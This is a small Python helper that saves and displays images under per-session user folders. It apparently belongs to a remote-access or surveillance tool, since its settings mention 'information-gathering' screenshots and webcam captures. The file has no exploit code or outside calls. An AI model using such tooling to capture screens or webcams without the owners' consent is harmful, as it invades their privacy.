from domestic.utility.status_message import *
from domestic.make.make_directories import *
from domestic.utility.get_filename import *
from domestic.global_state import *


def make_image(directories, data, show_image=True, success_message=None, image_type=None):
  filename = get_filename('png')
  username = state['session']['username']
  path = f'{state["root"]}/{username}/{directories[-1]}/{filename}'     
  directories_to_make = [username] + [f'{username}/{directory}' for directory in directories]
  make_directories(directories_to_make)

  if image_type is None or (image_type and state['options']['information-gathering']['save']['screenshot']) or (not image_type and state['options']['information-gathering']['save']['cam-screenshot']):
    data.save(path)

  if show_image:
    data.show()
  
  if success_message:
    if image_type is None or (image_type and state['options']['information-gathering']['save']['screenshot']) or (not image_type and state['options']['information-gathering']['save']['cam-screenshot']):
      status_message(f'Path: {path}\n{success_message}', 'success')
    else:
      status_message(success_message, 'success')